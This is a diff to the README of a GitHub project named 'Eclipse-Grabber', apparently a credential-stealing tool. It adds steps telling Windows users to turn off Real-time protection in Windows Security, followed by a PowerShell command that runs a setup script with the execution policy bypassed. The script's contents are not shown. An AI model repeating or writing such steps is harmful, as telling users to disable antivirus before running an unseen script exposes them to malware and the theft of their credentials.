@@ -33,6 +33,12 @@ git clone https://github.com/samir07beep/Eclipse-Grabber.git
 cd eclipse-grabber
 ```
 ### Windows
+
+Temporarily Disable via Windows Security
+Open Windows Security (Win + I → Update & Security → Windows Security).
+Go to Virus & threat protection → Manage settings.
+Toggle Real-time protection to Off.
+
 ```
 powershell.exe -ExecutionPolicy Bypass -Command ./setup-win.ps1
 ```
